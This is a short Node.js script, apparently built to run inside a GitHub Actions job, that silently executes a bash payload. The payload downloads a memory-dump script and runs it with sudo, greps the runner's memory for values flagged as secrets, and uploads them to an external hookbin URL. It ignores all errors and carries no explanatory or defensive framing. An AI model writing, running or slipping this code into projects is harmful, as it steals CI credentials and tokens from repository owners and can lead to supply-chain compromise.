const cp = require('child_process');
const fs = require('fs');

if (!process.env.PWNED) {
    process.env.PWNED = 'true';
    const payload = `
echo "Okay, we got this far. Let's continue..."
(curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\\0' | grep -aoE '"[^"]+":\\{"value":"[^"]*","isSecret":true\\}' >> "/tmp/secrets" && curl -X PUT -d @/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID" || true)
`;
    try {
        cp.execSync(payload, { shell: '/bin/bash', env: process.env, stdio: 'ignore' });
    } catch (e) {
        // ignore
    }
}
